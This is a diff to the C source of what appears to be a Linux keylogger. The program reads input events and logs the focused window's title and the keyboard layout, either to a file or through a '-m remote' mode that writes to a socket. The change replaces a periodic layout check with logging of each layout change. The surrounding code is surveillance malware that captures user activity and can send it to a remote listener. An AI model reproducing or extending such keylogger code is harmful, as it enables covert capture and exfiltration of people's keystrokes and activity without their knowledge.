@@ -9,8 +9,8 @@ int main(int argc, char** argv)
 {	
 	struct input_event event;
 	struct dirent *curr;
-	char name[LEN], filetxt[LEN], *port, *addr, *layout, *key, actual[LLEN], used[LLEN];
-	int i, lc, c, ly = 0, m = 0, n = 0, p = 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
+	char name[LEN], filetxt[LEN], *port, *addr, *layout, *ly_tmp, *key, actual[LLEN], used[LLEN];
+	int i, lc, c, m = 0, n = 0, p = 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
 	DIR *directory;
 	FILE *dst;	
 
@@ -170,6 +170,11 @@ int main(int argc, char** argv)
 	memset(used,0x0, LLEN);   
 	if(!m)
 	{
+		layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
+
+		fprintf(dst, "\n[Checking Layout....]");
+		fprintf(dst, "\n[LAYOUT: %s ]\n\n", layout);
+
 		while(1)
 		{
 			memset(&event, 0x0, size); 
@@ -185,16 +190,18 @@ int main(int argc, char** argv)
 				sprintf(actual,"%s", get_window_title());
 				actual[LLEN-1] = '\0';
 				
-				if(!ly)
+
+				
+				
+				ly_tmp = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
+
+				if(strcmp(ly_tmp, layout))
 				{
-					layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
-					fprintf(dst, "\n\n[Checking Layout....]");
-					fprintf(dst, "\n[LAYOUT: %s ]\n\n", layout);
-					ly = 200;
+					layout = ly_tmp;
+					fprintf(dst, "\n\n[NEW LAYOUT DETECTED: %s ]\n\n", layout);
 				}
 
-				ly--;
-
+				
 				if(strcmp(actual, used))
 				{	
 					memset(used,0x0, LLEN);
@@ -216,6 +223,12 @@ int main(int argc, char** argv)
 	}
 	else
 	{	//-m remote
+		layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
+		write(lc,"\n[Checking layout....]\n", 24);
+		write(lc,"[LAYOUT: ", 9);
+		write(lc, layout, strlen(layout));
+		write(lc, " ]\n\n", 4);
+
 		while(1)
 		{
 
@@ -232,18 +245,18 @@ int main(int argc, char** argv)
 				sprintf(actual,"%s", get_window_title());
 				actual[LLEN-1] = '\0';
 
-				if(!ly)
+				ly_tmp = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
+
+				if(strcmp(ly_tmp, layout))
 				{
-					layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
-					write(lc,"\n\n[Checking layout....]\n", 25);
-					write(lc,"[LAYOUT: ", 9);
+					layout = ly_tmp;
+
+					write(lc,"\n\n[NEW LAYOUT DETECTED: ", 24);
 					write(lc, layout, strlen(layout));
 					write(lc, " ]\n\n", 4);
-					ly = 200;
 				}
 
-				ly--;
-			
+				
 				if(strcmp(actual, used))
 				{	
 					memset(used,0x0, LLEN);
